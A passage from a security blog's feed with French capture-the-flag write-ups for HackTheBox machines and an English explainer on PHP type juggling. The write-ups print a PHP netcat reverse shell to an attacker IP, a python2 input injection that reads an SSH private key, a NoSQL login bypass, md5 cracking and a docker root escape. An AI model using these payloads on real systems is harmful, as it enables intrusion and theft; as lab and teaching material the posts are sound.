</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;file&#34;</span>,<span style="color:#e6db74">&#34;/tmp/error-output.txt&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>)
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$cwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/tmp&#39;</span>;
</span></span><span style="display:flex;"><span>$env<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;some_option&#39;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#39;aeiou&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$process<span style="color:#f92672">=</span><span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#39;sh&#39;</span>,$descriptorspec,$pipes,$cwd,$env);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_resource</span>($process)){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>($pipes[<span style="color:#ae81ff">0</span>],<span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.172 9001 &gt;/tmp/f&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">stream_get_contents</span>($pipes[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $return_value <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_close</span>($process);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;command returned </span><span style="color:#e6db74">$return_value\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><blockquote>
<p>J’utilise un reverse shell spécial qui bypass exec(), shell_exec() et toutes les fonctions de ce type car elles sont filtrées</p>
</blockquote>
<p>On lance notre netcat, on upload le fichier puis on le visite&hellip;</p>
<h1 id="lateral-move">Lateral Move</h1>
<p>Maintenant qu&rsquo;on est connectés à la machine, routine classique pour stabiliser le shell</p>
<pre tabindex="0"><code>python3 -c ‘import pty;pty.spawn(”/bin/bash”)’
</code></pre><pre tabindex="0"><code>export TERM=xterm
</code></pre><p>Et on se contentera de ça !</p>
<p>En regardant dans le home de developer, il y a un dossier “<code>dev</code>”, dans lequel se trouve un <code>siteisup_test.py</code> et un <code>siteisup</code></p>
<p>En faisant un <code>ls -la</code>, on voit que le fichier <code>siteisup</code> a le <code>setuid bit</code>, ce qui veux dire qu’il est executé en tant que l’owner du fichier, soit en tant que <code>developer</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/206529938-755d3c14-48bb-4964-a103-942fd86565a1.png" alt="2022-12-08-183857_930x1026_scrot"></p>
<p>Partons du principe qu&rsquo;il s&rsquo;agit seulement d&rsquo;une version compilée du .py qui se trouve dans le même répertoire</p>
<p>Il retourne cette erreur au lancement:</p>
<pre tabindex="0"><code>SyntaxError: Missing parentheses in call to &#39;print&#39;. Did you mean print(&#34;Website is up&#34;)?
</code></pre><p>On peut cat le <code>.py</code> pour essayer de comprendre un peu mieux ce qu&rsquo;il se passe:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter URL here:&#34;</span>)
</span></span><span style="display:flex;"><span>page <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> page<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>	print <span style="color:#e6db74">&#34;Website is up&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>	print <span style="color:#e6db74">&#34;Website is down&#34;</span>
</span></span></code></pre></div><p>Cette syntaxe du print est propre à python2, et on peut se douter que ceci n’a pas été laissé au hasard</p>
<p>On cherche donc des vulnérabilités de python2 sur google, et assez vite on peut se rendre compte que toutes les input en python2 sont injectables</p>
<p>En entrant un payload dans un input, ce dernier est executé avant que le programme plante</p>
<p>On va donc lancer le fichier avec python2 puis entrer ce payload dans l’input:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cat /home/developer/.ssh/id_rsa&#34;</span>)
</span></span></code></pre></div><p>Ce dernier va simplement lire la clé SSH de l’user <code>developer</code></p>
<p>Bien évidemment, en lançant le .py, il retourne une permission denied, puisque le fichier n’a pas le <code>setuid bit</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/206530087-0f7a497f-3e72-497a-b9fb-674a607980bb.png" alt="2022-12-08-184616_930x1026_scrot"></p>
<p>En essayant le même payload mais cette fois dans l&rsquo;input du binaire, ça fonctionne, et on a la clé de <code>developer</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/206530137-52159fbe-e846-4f61-8bdc-478e6316566d.png" alt="2022-12-08-184731_1888x1032_scrot"></p>
<p>On save la clé localement puis on met à jour ses permissions pour pouvoir l&rsquo;utiliser avec la commande <code>ssh</code></p>
<pre tabindex="0"><code>chmod 700 id_rsa.key
</code></pre><p>On se <code>ssh</code> en tant que <code>developer</code></p>
<pre tabindex="0"><code>ssh -i id_rsa.key developer@siteisup.htb
</code></pre><p><img src="https://user-images.githubusercontent.com/77807503/206532498-83e17824-9b76-40cb-9054-4ce86793ade0.png" alt="2022-12-08-184929_1888x1032_scrot"></p>
<h1 id="privilege-escalation">Privilege escalation</h1>
<p>Le root étant extrêmement facile, on va pouvoir passer assez vite dessus</p>
<pre tabindex="0"><code>sudo -l
</code></pre><p>Cela nous montre que <code>developer</code> peut utiliser le binaire <code>/usr/local/bin/easy_install</code> avec <code>sudo</code></p>
<p>On trouve <a href="https://gtfobins.github.io/gtfobins/easy_install/#sudo">cet exploit</a> sur GTFOBins</p>
<p><img src="https://user-images.githubusercontent.com/77807503/206530338-5c55b870-ef6c-47a2-951d-36b88ba6f0d1.png" alt="2022-12-08-185201_1888x1032_scrot"></p>
<h6 id="back-to-top"><a href="#"><em>back to top</em></a></h6>
]]></content>
        </item>
        
        <item>
            <title>📗 HackTheBox - Shoppy</title>
            <link>/posts/2023/01/hackthebox-shoppy/</link>
            <pubDate>Sat, 14 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/hackthebox-shoppy/</guid>
            <description>Table of contents Recon
Foothold
Lateral Move
Privilege Escalation
Note Il s&amp;rsquo;agit d&amp;rsquo;un des premiers write-ups que j&amp;rsquo;ai écrit de ma vie, j&amp;rsquo;ai attendu que la machine retire avant de le poster. C&amp;rsquo;est possible que je n&amp;rsquo;utilise pas les bons termes à certains endroit, je n&amp;rsquo;ai pas relu tout le write-up pour me corriger (j&amp;rsquo;ai bien trop la flemme).
Vous allez aussi pouvoir voir à quoi ressemblait mon mAgniFiQuE Ubuntu à cette époque (pas si lointaine)</description>
            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
<hr>
<ul>
<li>
<p><a href="#recon">Recon</a></p>
</li>
<li>
<p><a href="#foothold">Foothold</a></p>
</li>
<li>
<p><a href="#lateral-move">Lateral Move</a></p>
</li>
<li>
<p><a href="#privilege-escalation">Privilege Escalation</a></p>
</li>
</ul>
<hr>
<h1 id="note">Note</h1>
<p>Il s&rsquo;agit d&rsquo;un des premiers write-ups que j&rsquo;ai écrit de ma vie, j&rsquo;ai attendu que la machine <em>retire</em> avant de le poster. C&rsquo;est possible que je n&rsquo;utilise pas les bons termes à certains endroit, je n&rsquo;ai pas relu tout le write-up pour me corriger (j&rsquo;ai bien trop la flemme).</p>
<p>Vous allez aussi pouvoir voir à quoi ressemblait mon m<em>A</em>g<code>n</code>i<strong>F</strong><em>i</em>Qu<strong>E</strong> Ubuntu à cette époque (pas si lointaine)</p>
<h1 id="recon">Recon</h1>
<p>On arrive sur une page vide, avec un timer de 349 jours, et un message &ldquo;<em>Shoppy beta coming soon ! Stay tuned for beta access !</em>&rdquo;</p>
<p>Il s&rsquo;agit donc d&rsquo;une application qui n&rsquo;est pas encore déployée, on peut s&rsquo;attendre à un docker ou quelque chose du type</p>
<p><img src="https://i.ibb.co/qJVWWzd/image.png" alt="page.png"></p>
<p>On lance un dirbuster pour essayer de trouver des directories sur le site, et un wfuzz pour les sous domaines</p>
<p>Le dirbuster nous donne <code>http://shoppy.htb/admin</code> et <code>http://shoppy.htb/login</code></p>
<p>Le wfuzz nous donne <code>http://mattermost.shoppy.htb</code></p>
<p><img src="https://i.ibb.co/JtgYkcL/image.png" alt="dirbwfuzz.png"></p>
<h1 id="foothold">Foothold</h1>
<p>On commence par aller voir le <strong>/login</strong>, c&rsquo;est un form de connection classique avec un input et un username</p>
<p>On peut tenter une injection SQL: <code>username=admin' or1=1--</code> et <code>password=admin</code></p>
<p>La requête prend beaucoup de temps, puis le serveur me renvoie un gateway timeout&hellip;</p>
<p>On tente cette fois une injection NoSQL: <code>username=admin'||'1==1</code> &amp; <code>password=admin</code></p>
<p>Et&hellip;.. on est connectés en tant qu&rsquo;admin</p>
<p><img src="https://i.ibb.co/ySNrqtN/image.png" alt="admin.png"></p>
<p>On est redirigés sur le <strong>/admin</strong>, qui est&hellip; vide</p>
<p>Il y a quand même un bouton <em>Search for users</em>, qui redirige vers <code>/admin/search-users</code></p>
<p><img src="https://i.ibb.co/KKxp5Dc/image.png" alt="panel.png"></p>
<p>On a juste un input, en partant du principe que c&rsquo;est le même backend qui gère ça aussi, j&rsquo;entre la même injection NoSQL que pour le login, qui renverra <code>True</code>, soit <strong>tout les utilisateurs</strong>
J&rsquo;entre donc <code>a'||'1==1</code> dans l&rsquo;input, et j&rsquo;appuie sur le bouton Download export qui apparaît</p>
<p><img src="https://i.ibb.co/c3qhSFn/image.png" alt="search.png"></p>
<p>On voit <strong>deux utilisateurs</strong>: <code>admin</code> et <code>josh</code></p>
<p>On a aussi les deux hash de leurs mot de passe, en md5</p>
<p><img src="https://i.ibb.co/vQmY4PT/image.png" alt="export.png"></p>
<p>Qui dit hash, dit hashcat, on prend le hash de josh, et on lance hashcat  avec le hash <code>6ebcea65320589ca4f2f1ce039975995</code> et rockyou en wordlist</p>
<p><img src="https://i.ibb.co/FDXvRGf/image.png" alt="hashcat.png"></p>
<p>On a maintenant le mot de passe de josh</p>
<blockquote>
<p>Note: Je suis allé me connecter au /admin avec ses logins, ça a fonctionné mais il avait le même panel que l&rsquo;utilisateur admin</p>
</blockquote>
<p>Je vais sur le mattermost pour me connecter avec le compte de <strong>josh</strong></p>
<p><img src="https://i.ibb.co/2WRgD8Q/image.png" alt="mattermost.png"></p>
<p>En se balandant un peu sur le mattermost, on trouve un channel privé &ldquo;deploy machine&rdquo;, dans lequel on trouve des identifiants, probabelement pour se connecter au ssh de la machine</p>
<p><img src="https://i.ibb.co/qxJn844/image.png" alt="ssh.png"></p>
<h1 id="lateral-move">Lateral Move</h1>
<p><code>ssh jaeger@10.10.11.180</code></p>
<p>On est connectés au SSH, on <code>cat user.txt</code> pour flag le user</p>
<p><img src="https://i.ibb.co/MgZ5hHH/image.png" alt="user.png"></p>
<p>On fait un <code>sudo -l</code> pour voir si on a des accès particuliers</p>
<p><img src="https://i.ibb.co/j47VCt5/image.png" alt="sudol.png"></p>
<p>On voit qu&rsquo;on peut éxécuter password-manager en tant que deploy sur la machine, on va d&rsquo;abord aller voir ce qu&rsquo;il y a dans ce dernier</p>
<p><code>cat /home/deploy/password-manager</code></p>
<p><img src="https://i.ibb.co/F3kZKzF/image.png" alt="password.png"></p>
<p>C&rsquo;est très peu lisible puisqu&rsquo;il s&rsquo;agit d&rsquo;un ELF mais on voit, sur la ligne au milieu du screen, que si on entre <strong>Sample</strong> quand il demande le password, il nous autorise l&rsquo;accès</p>
<p>On va donc lancer password-manager en tant que deploy puis entrer le mot de passe</p>
<p><code>sudo -u deploy /home/deploy/password-manager</code></p>
<p><img src="https://i.ibb.co/DkK0WfM/image.png" alt="deploy.png"></p>
<p>On a les identifiants de l&rsquo;user deploy, on va s&rsquo;y connecter</p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Une fois connecté, on voit, en faisant <code>id</code> que deploy est dans le groupe <strong>docker</strong></p>
<p><img src="https://i.ibb.co/xYBk7x5/image.png" alt="docker.png"></p>
<p>On va donc partir sur une docker escape, qu&rsquo;on récupère sur GTFObins:</p>
<p><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></p>
<p><img src="https://i.ibb.co/hCQpDDz/image.png" alt="root.png"></p>
<h6 id="back-to-top"><a href="#"><em>back to top</em></a></h6>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 What is: &#34;Type Juggling&#34;</title>
            <link>/posts/2023/01/what-is-type-juggling/</link>
            <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/what-is-type-juggling/</guid>
            <description>Table of contents Introduction
Comparisons in PHP
What causes the vulnerability
Semi-Patched
Better example
How to avoid type juggling issues
Conclusion
Further documentation
Prerequisites Know basic PHP Be familiar with the concept of value &amp;ldquo;types&amp;rdquo; (string, integer, float&amp;hellip;) Introduction PHP is a very famous and flexible backend programming language that aims to facilitate developer&amp;rsquo;s lives. Unfortunately, this flexibility can sometimes lead to more or less critical vulnerabilities.
In PHP, type juggling is a functionnality that allows developers to be more flexible when they use the language, but it can also be dangerous when it&amp;rsquo;s not used carefully.</description>
            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
<hr>
<ul>
<li>
<p><a href="#introduction">Introduction</a></p>
</li>
<li>
<p><a href="#comparisons-in-php">Comparisons in PHP</a></p>
</li>
<li>
<p><a href="#what-causes-the-vulnerability">What causes the vulnerability</a></p>
</li>
<li>
<p><a href="#semi-patched">Semi-Patched</a></p>
</li>
<li>
<p><a href="#better-example">Better example</a></p>
</li>
<li>
<p><a href="#how-to-avoid-type-juggling-issues">How to avoid type juggling issues</a></p>
</li>
<li>
<p><a href="#conclusion">Conclusion</a></p>
</li>
<li>
<p><a href="#further-documentation">Further documentation</a></p>
</li>
</ul>
<hr>
<h1 id="prerequisites">Prerequisites</h1>
<ul>
<li>Know basic PHP</li>
<li>Be familiar with the concept of value &ldquo;types&rdquo; (string, integer, float&hellip;)</li>
</ul>
<h1 id="introduction">Introduction</h1>
<p>PHP is a very famous and flexible backend programming language that aims to facilitate developer&rsquo;s lives. Unfortunately, this flexibility can sometimes lead to more or less critical vulnerabilities.</p>
<p>In PHP, <strong>type juggling</strong> is a functionnality that allows developers to be more flexible when they use the language, but it can also be dangerous when it&rsquo;s not used carefully. There are a ton of challenges about this subject so I hope this article will help you to understand it better.</p>
<p>I will first explain in more detail what <strong>type juggling</strong> is, why it can cause security issues and then we will see a better and more concrete example of an exploit that abuses it.</p>
<h1 id="comparisons-in-php">Comparisons in PHP</h1>
<p>PHP has a functionnality called <strong>type juggling</strong>, which means that when you compare two values, PHP will change one&rsquo;s type to match the other&rsquo;s. For example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>This code compares a <strong>string</strong> with an <strong>integer</strong> and indicates if the values are equal or not.</p>
<p>In this case, the script will return <code>True</code>, and that is thanks to <strong>type juggling</strong></p>
<p>When running the code, PHP will convert the <strong>string</strong> to an <strong>integer</strong> to be able to compare the two values. This condition can also we written like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>And that is <code>True</code></p>
<p>This functionnality can really make your life easier when you&rsquo;re working with multiple variables types and user inputs, but it can also be very dangerous, so use it carefully.</p>
<h1 id="what-causes-the-vulnerability">What causes the vulnerability</h1>
<p>It is actually very simple and logical, probably even for someone that doesn&rsquo;t know PHP. Let&rsquo;s take the same example as before and tweak it a little bit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;1 2 3 foo&#34;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Now, what do you think this code will return ?</p>
<p>Well, because of type juggling, it will return <code>True</code> &ndash; but that&rsquo;s false, right?</p>
<p>Yes, and no&hellip; What happens when the comparison is made is that PHP takes an integer from the string, and compares it with 1. And because our string contains &ldquo;1&rdquo;, the condition is <code>True</code></p>
<p>What happens if we remove the &ldquo;1&rdquo; from the string ?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;2 3 foo&#34;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>This time, the condition will be <code>False</code> because PHP won&rsquo;t find &ldquo;1&rdquo; in the given string.</p>
<p>But it doesn&rsquo;t end there, here is what happens if instead of comparing a string to 1, we compare it to 0:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;Hello World&#34;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>In this case, the condition will be <code>True</code> because PHP is going to change the type of the string to an integer, which will be equal to 0 because <strong>a string doesn&rsquo;t have &ldquo;an integer value&rdquo;</strong> and 0 is the default value.</p>
<h1 id="semi-patched">Semi-Patched</h1>
<p>Every example I just showed you works in PHP 7.X, but that is not the latest PHP version, 8.X is.</p>
<p>This new version added, among other things, modifications regarding <strong>type juggling</strong>. To make it as simple as I can, they made the functionnality &ldquo;smarter&rdquo; by changing the way value&rsquo;s types are modified.</p>
<p>Let me explain this with an example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;Hello World&#34;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>In PHP 8.X, instead of trying to make &ldquo;Hello World&rdquo; an integer, PHP will make 0 a string (thus making it &ldquo;0&rdquo;) and the condition will look like this in the end:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;Hello World&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span></code></pre></div><p>And that will return <code>False</code></p>
<p>But this part would not be called &ldquo;Semi-Patched&rdquo; if the problem was fully solved. Here is another example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#ae81ff">123456789</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">123456789.0000000000</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>When comparing the two values, PHP will turn 123456789.0000000000 into an integer because it has no decimal value. The condition will then return <code>True</code>, which is mathematically correct but could allow an attacker to bypass length restrictions</p>
<p>Here is a table that shows the different results when a <strong>loose comparison</strong> (when PHP uses type juggling) occurs in <strong>PHP 7.X</strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/211122304-a2f5f310-ddbb-4b71-b8e2-63d9406de2d9.png" alt="Pasted image 20230107010517"></p>
<h1 id="better-example">Better example</h1>
<p>I will use a &ldquo;PHP Type juggling&rdquo; challenge I made as an example for this part.</p>
<blockquote>
<p>I will try to explain the code as much as I can, so don&rsquo;t worry if you&rsquo;re not comfortable with PHP.</p>
</blockquote>
<p>Here is the backend of a login page:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($username <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strcmp</span>(<span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">openssl_random_pseudo_bytes</span>(<span style="color:#ae81ff">10</span>)),$_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$_SESSION[<span style="color:#e6db74">&#39;isAdmin&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location:admin.php&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location:index.php?error=credentials&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>First, we make sure that the two POST parameters (used to pass the username and the password) are not empty. This line is not vulnerable.</p>
<p>The vulnerability is in the next condition, the one that checks the password. The <strong>strcmp</strong> function is used to compare a randomly generated password with the user&rsquo;s input.</p>
<blockquote>
<p>We compare the input with a randomly generated password because the goal of this challenge is not to figure out what the password is but rather to bypass the condition</p>
</blockquote>
<p>The <strong>strcmp</strong> function compares two strings and returns <code>0</code> if they are equal. To know if they are, we have to check if the function returned <code>0</code> or not.</p>
<p>What we can see is that this verification is made using a <strong>loose comparison</strong> (only two = were used)</p>
<p>And you should know that <strong>strcmp</strong> returns <code>NULL</code> if one of the two passed arguments is not a string. Knowing that, we just have to enter something else than a string for the password, and the function will return <code>NULL</code></p>
<p>By looking back the to <strong>loose comparison</strong> table, the condition NULL == 0 is <code>True</code>, so the whole comparison will also be <code>True</code>, like if the right password was entered.</p>
<h1 id="how-to-avoid-type-juggling-issues">How to avoid type juggling issues</h1>
<p>There&rsquo;s no magic method to avoid these problems all the time, but it is highly recomended to use strict comparisons (use three = instead of two) as often as you can, if not all the time.</p>
<p>Otherwise, you can also verify that the user entered two strings and not a string and an array (for example). <strong>Never trust user input</strong></p>
<h1 id="conclusion">Conclusion</h1>
<p>PHP is overall a good programming language, flexible and easy to get comfortable with. But all these advantages come at a cost, and one careless mistake can expose your application to critical vulnerabilities, that&rsquo;s why it is important to know how PHP works.</p>
